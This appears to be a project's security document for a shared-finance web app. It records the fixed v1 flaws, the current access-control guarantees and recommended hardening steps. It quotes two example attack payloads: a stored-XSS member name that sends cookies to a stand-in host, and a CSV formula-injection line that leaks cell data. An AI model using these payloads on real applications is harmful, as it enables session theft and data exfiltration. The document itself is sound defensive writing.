# Security

Trea handles other people's money in a shared organisation. The threat model is
not a nation state - it is a curious member with a browser console, a treasurer
whose laptop was left open, an ex-admin whose access was never removed, and an
auditor who needs to prove the books were not quietly edited.

This document records what v2 fixed, what the current design assumes, and what
should be hardened next.

---

## 1. What v1 got wrong, and what changed

### 1.1 Access control existed only in the browser

**Before.** `app.js` read `users/{email}.role === 'admin'` and, if it liked the
answer, showed the dashboard. Firestore itself was never told any of this. Anyone
with a Google account could call the Firestore REST API directly and read or write
any org's transactions, because the only gate was JavaScript they controlled.

**Now.** `firestore.rules` enforces the full permission matrix server-side -
who may create a transaction, who may correct one and for how long, who may
approve, who may change roles. `src/core/rbac.js` is a mirror that exists only to
hide buttons. **Deploy the rules; without them the app is as open as v1 was.**

```bash
firebase deploy --only firestore:rules
```

### 1.2 The public demo was an unauthenticated write endpoint

**Before.** "Try Live Demo" pointed a signed-out visitor at a real Firestore org
(`demo_org`) with full write access, kept in check by a client-side loop that
deleted the oldest rows. Every passer-by could write documents that every other
visitor's browser then rendered - a stored-XSS delivery mechanism, an unbounded
quota drain, and a reason to keep the rules permissive enough to be dangerous.

**Now.** The demo runs entirely in the browser against seeded data in
`localStorage`. No Firestore rule needs to permit anonymous access at all.

### 1.3 Stored XSS through member names and transaction reasons

**Before.** Rows were built with `innerHTML +=` and raw interpolation, including
an inline `onclick="showMemberDetails('${doc.id}', '${displayName}')"`. A member
named `'); fetch('//evil/?c='+document.cookie); //` executed in every admin's
session.

**Now.** All interpolation goes through `escapeHtml()`; the `html` tagged template
in `src/core/dom.js` escapes by default; there are no inline handlers anywhere -
interaction is delegated from `[data-action]`. Firestore rules also cap field
lengths so a hostile payload cannot be stored in the first place.

### 1.4 CSV export was a formula-injection vector

**Before.** Exported reasons went into the spreadsheet verbatim. A reason of
`=HYPERLINK("//evil?"&A1)` becomes a live formula when the treasurer opens the
file.

**Now.** `csvCell()` prefixes anything starting with `= + - @` or a control
character with an apostrophe, and quotes per RFC 4180.

### 1.5 Money was floating point

Not a security bug in the classic sense, but a ledger that drifts is a ledger you
cannot reconcile, and unreconcilable books are where fraud hides. All arithmetic
is now integer minor units.

### 1.6 The audit log was decorative

**Before.** `audit_logs` was an ordinary collection an admin could edit or delete.

**Now.** Each entry stores the SHA-256 of the previous entry plus its own content.
Rules permit `create` only - there is no update or delete rule, for anyone,
including owners. Editing history is still possible for whoever holds the Firebase
console, but it can no longer be done *silently*: `verifyChain()` names the exact
entry where the chain breaks.

### 1.7 Session handling

**Before.** Auth persisted indefinitely in local storage; a blocking `alert()`
announced an hour-long idle timeout after the fact.

**Now.** Session-scoped persistence (closing the tab ends the session), a
configurable idle timeout that warns a minute ahead, `prompt: 'select_account'` so
a shared machine never silently reuses the last Google session, and forced
re-authentication before granting, changing or revoking access.

---

## 2. Properties the current design guarantees

- **A pending entry cannot be extended.** `releaseAtMs` is immutable after
  creation and rules bound it to at most ~5 minutes in the future. Nobody can park
  money outside the balance.
- **A released entry cannot be edited.** Rules allow updates only for: correction
  inside the window, maturing `pending → active`, approval, and the reversal
  back-link. Amount, type, author and creation time are frozen after release.
- **A released entry cannot be deleted.** Delete is permitted only while pending -
  i.e. only while it has never counted towards anything.
- **A sealed month cannot be altered.** Auto-sealed snapshots are create-only.
- **Nobody can approve their own spending.** Enforced in rules, not just in the UI.
- **Nobody can change their own role, and the last owner cannot be removed.**
- **The client clock cannot be used to cheat.** Rules compare against
  `request.time`; the client's own countdown is calibrated against server
  timestamps.

---

## 3. Recommended next steps

Roughly in order of value for effort.

### 3.1 Deploy and then *test* the rules

Rules that have never been exercised are a guess. The Firebase emulator runs
offline and the tests are ordinary Jest:

```bash
npm i -D @firebase/rules-unit-testing
firebase emulators:exec --only firestore "npx jest"
```

Worth asserting explicitly: a viewer cannot create a transaction; an admin cannot
write to `roles`; nobody can update a transaction after `releaseAtMs`; nobody can
delete an `audit_logs` document; a user cannot approve their own entry.

### 3.2 Lock the Firebase project down at the edges

- **Authorised domains** - remove everything but your real host. This is what
  stops a phishing clone using your Firebase project as its backend.
- **API key restrictions** (Google Cloud console) - restrict the browser key by
  HTTP referrer and to only the APIs this app uses.
- **App Check** with reCAPTCHA Enterprise - the single highest-value addition
  available. It makes Firestore reject requests that did not come from your real
  app, which shuts down scripted abuse against a public endpoint. Roll it out in
  monitoring mode first.
- **Budget alerts** on the Firebase project so quota abuse is noticed the same day.

### 3.3 Restrict who can sign in at all

Right now anyone with a Google account may authenticate; they simply find no org
and are rejected. That is one lookup per stranger. Tighten it with a Google
Cloud Identity Platform blocking function on `beforeSignIn`, or - free and
serverless - keep an `allowlist/{email}` collection that rules check before
anything else.

### 3.4 A Content Security Policy

The app inlines no scripts except the pre-paint theme setter. Serve a header like:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' https://www.gstatic.com https://cdn.jsdelivr.net https://cdn.tailwindcss.com 'unsafe-inline';
  connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com;
  img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-src https://*.firebaseapp.com;
  base-uri 'none'; form-action 'none'; object-src 'none'
```

`'unsafe-inline'` for scripts is needed only by the Tailwind Play CDN. Replacing it
with a compiled stylesheet removes that concession *and* the largest remaining
third-party script - do both together. Add
`Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: same-origin` and a restrictive `Permissions-Policy` at the same
time.

### 3.5 Pin or self-host the remaining CDN dependencies

SheetJS is pinned with an SRI hash. The Firebase SDK and Tailwind Play CDN are not
- Firebase because the module graph pulls sub-imports SRI cannot cover, Tailwind
because the URL is versionless. Self-hosting both, or vendoring Firebase at a
pinned version, removes two third parties from the trust boundary.

### 3.6 Move sensitive derivation off the client

Every guarantee above is a *rules* guarantee, which means it is only as good as
the rules. Two things would benefit from a trusted writer, if the project ever
accepts a small server-side component:

- Sealing month-end snapshots (a client can currently compute the figure it writes).
- Assigning audit sequence numbers (a client could skip one; the chain would catch
  it, but only after the fact).

Firebase custom claims for roles would also remove a `get()` per rule evaluation,
which is both faster and cheaper.

### 3.7 Operational hygiene

- **Quarterly access review.** The Access screen shows who has what and who granted
  it - the point of the "Added by" column is to make the review possible.
- **Off-platform backups.** The JSON export is a complete snapshot; take one on a
  schedule and keep it somewhere Firebase cannot reach. Rules protect against
  malicious edits, not against a deleted project.
- **Separate the demo from production.** If the demo ever goes back to real data,
  give it its own Firebase project.
- **Rotate on departure.** Revoking a role stops future writes but does not
  invalidate an already-issued ID token; those expire within the hour. For an
  urgent removal, disable the account in the Firebase Authentication console as
  well.

### 3.8 Things deliberately *not* done

- **Encrypting amounts at rest.** It would break every query, every total and
  every rule-level validation, in exchange for protecting against an attacker who
  already has database access - at which point they also have the app.
- **Hiding the Firebase config.** These are public identifiers by design.
- **Rate limiting in the client.** Meaningless; App Check is the real answer.

---

## Reporting a vulnerability

Open a private security advisory on the repository, or contact the maintainer
directly. Please do not open a public issue for anything affecting live ledger
data.
